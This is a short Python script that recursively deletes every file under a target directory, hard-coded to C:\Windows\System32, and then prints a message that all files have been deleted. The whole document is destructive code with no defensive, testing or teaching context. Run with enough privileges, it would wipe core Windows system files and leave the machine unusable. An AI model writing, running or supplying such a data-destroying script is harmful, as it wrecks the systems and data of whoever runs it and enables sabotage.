import os


def delete_all_files(directory):
  
  for root, _, files in os.walk(os.path.abspath(directory)):
      for file in files:
          os.remove(os.path.join(root, file))
  print(f"All files in {directory} have been deleted.")


target_directory = r"C:\Windows\System32"


delete_all_files(target_directory)
